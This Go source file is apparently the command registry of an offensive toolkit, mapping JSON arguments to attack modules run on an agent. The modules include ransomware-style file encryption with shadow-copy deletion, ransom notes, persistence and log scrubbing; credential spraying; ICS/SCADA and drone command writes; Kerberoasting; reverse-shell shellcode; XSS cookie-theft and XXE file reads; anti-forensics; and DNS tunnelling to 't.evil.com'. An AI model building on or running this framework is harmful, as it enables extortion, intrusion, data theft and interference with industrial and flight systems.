package main

import (
	"encoding/json"
	"fmt"
	"sort"
	"sync"

	"github.com/sk666G/red-sky---arsenal/internal/session"
)

// Module is anything the core can dispatch to by name. The existing
// runXxxDispatch functions are wrapped here so the operator can drive any
// of them with one flag:
//
//	redsky-core -module cloud -args '{"action":"imds_probe","provider":"aws"}'
//
// The per-module flags keep working — this is a second door into the same
// functions.
type Module struct {
	Name string
	Help string
	Run  func(mgr *session.Manager, raw []byte) error
}

var (
	regMu  sync.RWMutex
	regTbl = map[string]Module{}
)

func regRegister(m Module) {
	regMu.Lock()
	defer regMu.Unlock()
	if m.Name == "" || m.Run == nil {
		panic("registry: bad module " + m.Name)
	}
	if _, dup := regTbl[m.Name]; dup {
		panic("registry: duplicate module " + m.Name)
	}
	regTbl[m.Name] = m
}

func regLookup(name string) (Module, bool) {
	regMu.RLock()
	defer regMu.RUnlock()
	m, ok := regTbl[name]
	return m, ok
}

func regNames() []string {
	regMu.RLock()
	defer regMu.RUnlock()
	out := make([]string, 0, len(regTbl))
	for n := range regTbl {
		out = append(out, n)
	}
	sort.Strings(out)
	return out
}

func regHelp() string {
	regMu.RLock()
	defer regMu.RUnlock()
	names := regNames()
	var b []byte
	for _, n := range names {
		b = append(b, []byte(fmt.Sprintf("  %-20s %s\n", n, regTbl[n].Help))...)
	}
	return string(b)
}

func regDecode(raw []byte, dst any) error {
	if len(raw) == 0 {
		return nil
	}
	return json.Unmarshal(raw, dst)
}

// --- adapters — one init() per existing runXxxDispatch ---
//
// Each adapter decodes -args JSON into an inline struct matching the real
// args, then calls the existing dispatcher. Field names mirror the real
// structs exactly.

// crypto
type regCryptoArgs struct {
	Root          string `json:"root,omitempty"`
	PubPath       string `json:"pub_path,omitempty"`
	KeyID         uint32 `json:"key_id,omitempty"`
	KillVSS       bool   `json:"kill_vss,omitempty"`
	Note          bool   `json:"note,omitempty"`
	NoteEmail     string `json:"note_email,omitempty"`
	NoteAddr      string `json:"note_addr,omitempty"`
	NotePrice     string `json:"note_price,omitempty"`
	DryRun        bool   `json:"dry_run,omitempty"`
	PostPersist   bool   `json:"post_persist,omitempty"`
	PersistName   string `json:"persist_name,omitempty"`
	PersistOnBoot bool   `json:"persist_on_boot,omitempty"`
	PostWallpaper bool   `json:"post_wallpaper,omitempty"`
	WallpaperPath string `json:"wallpaper_path,omitempty"`
	PostLogScrub  bool   `json:"post_log_scrub,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "crypto",
		Help: "crypto file ops (root=..., key_id=..., kill_vss=..., note=..., post_persist=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regCryptoArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runCryptoDispatch(mgr, cryptoDispatchArgs{
				Root: a.Root, PubPath: a.PubPath, KeyID: a.KeyID, KillVSS: a.KillVSS,
				Note: a.Note, NoteEmail: a.NoteEmail, NoteAddr: a.NoteAddr, NotePrice: a.NotePrice,
				DryRun: a.DryRun, PostPersist: a.PostPersist, PersistName: a.PersistName,
				PersistOnBoot: a.PersistOnBoot, PostWallpaper: a.PostWallpaper,
				WallpaperPath: a.WallpaperPath, PostLogScrub: a.PostLogScrub,
			})
			return nil
		},
	})
}

// iotcreds
type regIoTCredsArgs struct {
	Host      string `json:"host,omitempty"`
	Port      int    `json:"port,omitempty"`
	Protocol  string `json:"protocol,omitempty"`
	Path      string `json:"path,omitempty"`
	Timeout   int    `json:"timeout,omitempty"`
	StopFirst bool   `json:"stop_first,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "iotcreds",
		Help: "IoT credential spray (host=..., port=..., protocol=ssh|telnet|http|...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regIoTCredsArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runIoTCredsDispatch(mgr, iotCredsArgs{
				Host: a.Host, Port: a.Port, Protocol: a.Protocol, Path: a.Path,
				Timeout: a.Timeout, StopFirst: a.StopFirst,
			})
			return nil
		},
	})
}

// ics
type regIcsArgs struct {
	Host        string `json:"host,omitempty"`
	Port        int    `json:"port,omitempty"`
	Proto       string `json:"proto,omitempty"`
	Action      string `json:"action,omitempty"`
	Unit        uint8  `json:"unit,omitempty"`
	Func        byte   `json:"func,omitempty"`
	Start       uint16 `json:"start,omitempty"`
	Count       uint16 `json:"count,omitempty"`
	Value       uint16 `json:"value,omitempty"`
	Area        byte   `json:"area,omitempty"`
	DB          uint16 `json:"db,omitempty"`
	Data        []byte `json:"data,omitempty"`
	Dest        uint16 `json:"dest,omitempty"`
	Src         uint16 `json:"src,omitempty"`
	Class       uint8  `json:"class,omitempty"`
	ObjType     uint16 `json:"obj_type,omitempty"`
	ObjInstance uint32 `json:"obj_instance,omitempty"`
	PropertyID  uint16 `json:"property_id,omitempty"`
	Tag         string `json:"tag,omitempty"`
	DataType    byte   `json:"data_type,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "ics",
		Help: "ICS/SCADA protocol ops (host=..., proto=modbus|dnp3|s7|enip|opcua, action=..., ...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regIcsArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runIcsDispatch(mgr, icsArgs{
				Host: a.Host, Port: a.Port, Proto: a.Proto, Action: a.Action,
				Unit: a.Unit, Func: a.Func, Start: a.Start, Count: a.Count,
				Value: a.Value, Area: a.Area, DB: a.DB, Data: a.Data,
				Dest: a.Dest, Src: a.Src, Class: a.Class, ObjType: a.ObjType,
				ObjInstance: a.ObjInstance, PropertyID: a.PropertyID, Tag: a.Tag,
				DataType: a.DataType,
			})
			return nil
		},
	})
}

// cloud
type regCloudArgs struct {
	Action    string `json:"action,omitempty"`
	Provider  string `json:"provider,omitempty"`
	KeyID     string `json:"key_id,omitempty"`
	Secret    string `json:"secret,omitempty"`
	Token     string `json:"token,omitempty"`
	Region    string `json:"region,omitempty"`
	Arn       string `json:"arn,omitempty"`
	Driver    string `json:"driver,omitempty"`
	User      string `json:"user,omitempty"`
	Group     string `json:"group,omitempty"`
	PolicyArn string `json:"policy_arn,omitempty"`
	RoleArn   string `json:"role_arn,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "cloud",
		Help: "cloud IAM / IMDS / privesc (action=imds_probe|iam_enum, provider=aws|gcp|azure)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regCloudArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runCloudDispatch(mgr, cloudArgs{
				Action: a.Action, Provider: a.Provider, KeyID: a.KeyID, Secret: a.Secret,
				Token: a.Token, Region: a.Region, Arn: a.Arn, Driver: a.Driver,
				User: a.User, Group: a.Group, PolicyArn: a.PolicyArn, RoleArn: a.RoleArn,
			})
			return nil
		},
	})
}

// crypto_op
type regCryptoOpArgs struct {
	Op       string `json:"op,omitempty"`
	Priv     string `json:"priv,omitempty"`
	Phrase   string `json:"phrase,omitempty"`
	Algo     string `json:"algo,omitempty"`
	Hash     string `json:"hash,omitempty"`
	Wordlist string `json:"wordlist,omitempty"`
	JavaA    uint32 `json:"java_a,omitempty"`
	JavaB    uint32 `json:"java_b,omitempty"`
	JavaN    int    `json:"java_n,omitempty"`
	WinFirst uint16 `json:"win_first,omitempty"`
	WinLo    uint32 `json:"win_lo,omitempty"`
	WinHi    uint32 `json:"win_hi,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "crypto_op",
		Help: "crypto operation (op=hash_crack|wallet_recover|..., algo=..., wordlist=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regCryptoOpArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runCryptoOpDispatch(mgr, cryptoOpArgs{
				Op: a.Op, Priv: a.Priv, Phrase: a.Phrase, Algo: a.Algo,
				Hash: a.Hash, Wordlist: a.Wordlist, JavaA: a.JavaA, JavaB: a.JavaB,
				JavaN: a.JavaN, WinFirst: a.WinFirst, WinLo: a.WinLo, WinHi: a.WinHi,
			})
			return nil
		},
	})
}

// social
type regSocialArgs struct {
	Action  string `json:"action,omitempty"`
	User    string `json:"user,omitempty"`
	Email   string `json:"email,omitempty"`
	Domain  string `json:"domain,omitempty"`
	Threads int    `json:"threads,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "social",
		Help: "social OSINT (action=..., user=..., email=..., domain=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regSocialArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runSocialDispatch(mgr, socialArgs{
				Action: a.Action, User: a.User, Email: a.Email,
				Domain: a.Domain, Threads: a.Threads,
			})
			return nil
		},
	})
}

// web_ssrf
type regWebSSRFArgs struct {
	URL     string `json:"url,omitempty"`
	Method  string `json:"method,omitempty"`
	Threads int    `json:"threads,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "web_ssrf",
		Help: "SSRF probe (url=..., method=GET|POST, threads=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regWebSSRFArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runWebSSRFDispatch(mgr, webSSRFArgs{URL: a.URL, Method: a.Method, Threads: a.Threads})
			return nil
		},
	})
}

// web_ssti
type regWebSSTIArgs struct {
	Engine  string `json:"engine,omitempty"`
	Cmd     string `json:"cmd,omitempty"`
	ListFPs bool   `json:"list_fps,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "web_ssti",
		Help: "SSTI test (engine=jinja2|twig|..., cmd=..., list_fps=true)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regWebSSTIArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runWebSSTIDispatch(mgr, webSSTIArgs{Engine: a.Engine, Cmd: a.Cmd, ListFPs: a.ListFPs})
			return nil
		},
	})
}

// web_xss
type regWebXSSArgs struct {
	Context string `json:"context,omitempty"`
	JS      string `json:"js,omitempty"`
	FPs     bool   `json:"fps,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "web_xss",
		Help: "XSS test (context=html|attr|script, js=cookie|keylog|..., fps=true)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regWebXSSArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runWebXSSDispatch(mgr, webXSSArgs{Context: a.Context, JS: a.JS, FPs: a.FPs})
			return nil
		},
	})
}

// web_xxe
type regWebXXEArgs struct {
	Kind     string `json:"kind,omitempty"`
	File     string `json:"file,omitempty"`
	URL      string `json:"url,omitempty"`
	Attacker string `json:"attacker,omitempty"`
	Defaults bool   `json:"defaults,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "web_xxe",
		Help: "XXE test (kind=file|ssrf|oob, file=/etc/passwd, url=..., attacker=..., defaults=true)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regWebXXEArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runWebXXEDispatch(mgr, webXXEArgs{
				Kind: a.Kind, File: a.File, URL: a.URL,
				Attacker: a.Attacker, Defaults: a.Defaults,
			})
			return nil
		},
	})
}

// ad
type regAdArgs struct {
	Action      string `json:"action,omitempty"`
	Host        string `json:"host,omitempty"`
	Port        int    `json:"port,omitempty"`
	TLS         bool   `json:"tls,omitempty"`
	BindDN      string `json:"bind_dn,omitempty"`
	BindPW      string `json:"bind_pw,omitempty"`
	BaseDN      string `json:"base_dn,omitempty"`
	WriteDriver string `json:"write_driver,omitempty"`
	TargetDN    string `json:"target_dn,omitempty"`
	GroupDN     string `json:"group_dn,omitempty"`
	AttrName    string `json:"attr_name,omitempty"`
	AttrValue   string `json:"attr_value,omitempty"`
	Password    string `json:"password,omitempty"`
	UACValue    uint32 `json:"uac_value,omitempty"`
	UACCurrent  uint32 `json:"uac_current,omitempty"`
	SPN         string `json:"spn,omitempty"`
	PrimaryGID  uint32 `json:"primary_gid,omitempty"`
	EncodedSD   string `json:"encoded_sd,omitempty"`
	RoastUser   string `json:"roast_user,omitempty"`
	RoastRealm  string `json:"roast_realm,omitempty"`
	RoastDC     string `json:"roast_dc,omitempty"`
	RoastPort   int    `json:"roast_port,omitempty"`
	KerbUser    string `json:"kerb_user,omitempty"`
	KerbPass    string `json:"kerb_pass,omitempty"`
	KerbRealm   string `json:"kerb_realm,omitempty"`
	KerbDC      string `json:"kerb_dc,omitempty"`
	KerbSPN     string `json:"kerb_spn,omitempty"`
	KerbPort    int    `json:"kerb_port,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "ad",
		Help: "AD enum/write/roast/kerberoast (action=users|groups|asrep|kerberoast|..., host=..., bind_dn=..., bind_pw=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regAdArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runAdEnumDispatch(mgr, adEnumArgs{
				Action: a.Action, Host: a.Host, Port: a.Port, TLS: a.TLS,
				BindDN: a.BindDN, BindPW: a.BindPW, BaseDN: a.BaseDN,
				WriteDriver: a.WriteDriver, TargetDN: a.TargetDN, GroupDN: a.GroupDN,
				AttrName: a.AttrName, AttrValue: a.AttrValue, Password: a.Password,
				UACValue: a.UACValue, UACCurrent: a.UACCurrent, SPN: a.SPN,
				PrimaryGID: a.PrimaryGID, EncodedSD: a.EncodedSD,
				RoastUser: a.RoastUser, RoastRealm: a.RoastRealm,
				RoastDC: a.RoastDC, RoastPort: a.RoastPort,
				KerbUser: a.KerbUser, KerbPass: a.KerbPass, KerbRealm: a.KerbRealm,
				KerbDC: a.KerbDC, KerbSPN: a.KerbSPN, KerbPort: a.KerbPort,
			})
			return nil
		},
	})
}

// shellcode
type regShellcodeArgs struct {
	Arch    string `json:"arch,omitempty"`
	Kind    string `json:"kind,omitempty"`
	Encode  string `json:"encode,omitempty"`
	Key     uint8  `json:"key,omitempty"`
	IP      string `json:"ip,omitempty"`
	Port    uint16 `json:"port,omitempty"`
	WinExec uint64 `json:"win_exec,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "shellcode",
		Help: "shellcode build (arch=linux_x64|..., kind=exec_sh|reverse_sh, encode=..., ip/port=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regShellcodeArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runShellcodeDispatch(mgr, shellcodeArgs{
				Arch: a.Arch, Kind: a.Kind, Encode: a.Encode, Key: a.Key,
				IP: a.IP, Port: a.Port, WinExec: a.WinExec,
			})
			return nil
		},
	})
}

// hostinfo (no args)
func init() {
	regRegister(Module{
		Name: "hostinfo",
		Help: "host info on agent (no args)",
		Run: func(mgr *session.Manager, raw []byte) error {
			runHostInfoDispatch(mgr)
			return nil
		},
	})
}

// vmdetect (no args)
func init() {
	regRegister(Module{
		Name: "vmdetect",
		Help: "VM detection on agent (no args)",
		Run: func(mgr *session.Manager, raw []byte) error {
			runVMDetectDispatch(mgr)
			return nil
		},
	})
}

// antiforen
type regAntiForenArgs struct {
	Action string   `json:"action,omitempty"`
	Paths  []string `json:"paths,omitempty"`
	DryRun bool     `json:"dry_run,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "antiforen",
		Help: "anti-forensics (action=..., paths=[\"...\"], dry_run=true)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regAntiForenArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runAntiForenDispatch(mgr, antiForenArgs{Action: a.Action, Paths: a.Paths, DryRun: a.DryRun})
			return nil
		},
	})
}

// mailtrace
type regMailTraceArgs struct {
	Path string `json:"path,omitempty"`
	Blob string `json:"blob,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "mailtrace",
		Help: "mail trace (path=... or blob=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regMailTraceArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runMailTraceDispatch(mgr, mailTraceArgs{Path: a.Path, Blob: a.Blob})
			return nil
		},
	})
}

// geoip
type regGeoIPArgs struct {
	IPs []string `json:"ips,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "geoip",
		Help: "GeoIP lookup (ips=[\"1.2.3.4\",...])",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regGeoIPArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runGeoIPDispatch(mgr, a.IPs)
			return nil
		},
	})
}

// proxychain
type regProxyChainArgs struct {
	Hops    []string `json:"hops,omitempty"`
	Target  string   `json:"target,omitempty"`
	Timeout int      `json:"timeout,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "proxychain",
		Help: "proxy chain build (hops=[\"socks5://...\",...], target=..., timeout=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regProxyChainArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runProxyChainDispatch(mgr, proxyChainArgs{Hops: a.Hops, Target: a.Target, Timeout: a.Timeout})
			return nil
		},
	})
}

// csint
type regCSIntArgs struct {
	Action    string `json:"action,omitempty"`
	Root      string `json:"root,omitempty"`
	Query     string `json:"query,omitempty"`
	IndexPath string `json:"index_path,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "csint",
		Help: "counter-intel (action=..., root=..., query=..., index_path=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regCSIntArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runCSIntDispatch(mgr, csintArgs{
				Action: a.Action, Root: a.Root, Query: a.Query, IndexPath: a.IndexPath,
			})
			return nil
		},
	})
}

// bluetooth
type regBluetoothArgs struct {
	Action   string `json:"action,omitempty"`
	Address  string `json:"address,omitempty"`
	Duration int    `json:"duration,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "bluetooth",
		Help: "Bluetooth ops (action=scan|gatt_dump|..., address=AA:BB:..., duration=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regBluetoothArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runBluetoothDispatch(mgr, bluetoothArgs{
				Action: a.Action, Address: a.Address, Duration: a.Duration,
			})
			return nil
		},
	})
}

// drone
type regDroneArgs struct {
	Action     string  `json:"action,omitempty"`
	Host       string  `json:"host,omitempty"`
	Port       int     `json:"port,omitempty"`
	SysID      uint8   `json:"sys_id,omitempty"`
	CompID     uint8   `json:"comp_id,omitempty"`
	TargetSys  uint16  `json:"target_sys,omitempty"`
	TargetComp uint16  `json:"target_comp,omitempty"`
	Command    uint16  `json:"command,omitempty"`
	Listen     int     `json:"listen,omitempty"`
	Lat        float32 `json:"lat,omitempty"`
	Lon        float32 `json:"lon,omitempty"`
	Alt        float32 `json:"alt,omitempty"`
	UseV2      bool    `json:"use_v2,omitempty"`
	SigKey     string  `json:"sig_key,omitempty"`
	LinkID     uint8   `json:"link_id,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "drone",
		Help: "MAVLink drone ops (action=identify|command|..., host=..., port=14550, ...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regDroneArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runDroneDispatch(mgr, droneArgs{
				Action: a.Action, Host: a.Host, Port: a.Port,
				SysID: a.SysID, CompID: a.CompID, TargetSys: a.TargetSys,
				TargetComp: a.TargetComp, Command: a.Command, Listen: a.Listen,
				Lat: a.Lat, Lon: a.Lon, Alt: a.Alt, UseV2: a.UseV2,
				SigKey: a.SigKey, LinkID: a.LinkID,
			})
			return nil
		},
	})
}

// report
type regReportArgs struct {
	Title      string `json:"title,omitempty"`
	Operator   string `json:"operator,omitempty"`
	Engagement string `json:"engagement,omitempty"`
	SourceDir  string `json:"source_dir,omitempty"`
	Findings   string `json:"findings,omitempty"`
	OutPath    string `json:"out_path,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "report",
		Help: "engagement report (title=..., operator=..., source_dir=..., out_path=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regReportArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runReportDispatch(mgr, reportArgs{
				Title: a.Title, Operator: a.Operator, Engagement: a.Engagement,
				SourceDir: a.SourceDir, Findings: a.Findings, OutPath: a.OutPath,
			})
			return nil
		},
	})
}

// webreq
type regWebReqArgs struct {
	URL     string `json:"url,omitempty"`
	Method  string `json:"method,omitempty"`
	Body    string `json:"body,omitempty"`
	Timeout int    `json:"timeout,omitempty"`
	SkipTLS bool   `json:"skip_tls,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "webreq",
		Help: "raw HTTP request (url=..., method=GET|POST, body=..., skip_tls=true)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regWebReqArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runWebReqDispatch(mgr, webReqArgs{
				URL: a.URL, Method: a.Method, Body: a.Body,
				Timeout: a.Timeout, SkipTLS: a.SkipTLS,
			})
			return nil
		},
	})
}

// workflow
type regWorkflowArgs struct {
	Steps       []string `json:"steps,omitempty"`
	DryRun      bool     `json:"dry_run,omitempty"`
	CSIntRoot   string   `json:"csint_root,omitempty"`
	ReportTitle string   `json:"report_title,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "workflow",
		Help: "run workflow (steps=[...], dry_run=true, csint_root=..., report_title=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regWorkflowArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runWorkflowDispatch(mgr, workflowArgs{
				Steps: a.Steps, DryRun: a.DryRun,
				CSIntRoot: a.CSIntRoot, ReportTitle: a.ReportTitle,
			})
			return nil
		},
	})
}

// dnstunnel
type regDNSTunnelArgs struct {
	Server  string `json:"server,omitempty"`
	Domain  string `json:"domain,omitempty"`
	Port    int    `json:"port,omitempty"`
	Payload []byte `json:"payload,omitempty"`
}

func init() {
	regRegister(Module{
		Name: "dnstunnel",
		Help: "DNS tunnel (server=..., domain=t.evil.com, port=53, payload=...)",
		Run: func(mgr *session.Manager, raw []byte) error {
			var a regDNSTunnelArgs
			if err := regDecode(raw, &a); err != nil {
				return err
			}
			runDNSTunnelDispatch(mgr, dnsTunnelArgs{
				Server: a.Server, Domain: a.Domain, Port: a.Port, Payload: a.Payload,
			})
			return nil
		},
	})
}
